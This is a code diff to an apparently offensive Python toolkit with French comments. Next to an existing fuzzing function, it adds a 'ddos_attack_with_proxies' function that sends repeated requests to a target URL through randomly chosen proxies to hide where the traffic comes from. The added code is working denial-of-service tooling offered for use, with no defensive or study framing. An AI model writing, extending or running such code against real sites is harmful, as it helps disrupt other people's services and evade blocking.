@@ -111,3 +111,16 @@ def fuzzing_attack(url):
                 print(colored(f"[-] Fuzzing échoué avec : {data}", "red"))
         except requests.exceptions.RequestException as e:
             print(colored(f"[!] Erreur lors du fuzzing : {e}", "red"))
+
+# Nouvelle fonction ajoutée pour effectuer une attaque DDoS avec des proxies
+def ddos_attack_with_proxies(url):
+    print(colored("[*] Lancement de l'attaque DDoS avec des proxies...", "yellow"))
+    try:
+        for _ in range(100):  # Attaque DDoS avec 100 requêtes
+            proxy = get_random_proxy()
+            print(f"[+] Utilisation du proxy : {proxy}")
+            response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=10)
+            print(f"Statut de la requête avec {proxy} : {response.status_code}")
+            time.sleep(0.1)  # Petit délai entre chaque requête pour éviter une surcharge immédiate
+    except requests.exceptions.RequestException as e:
+        print(colored(f"[!] Erreur lors de l'attaque DDoS : {e}", "red"))
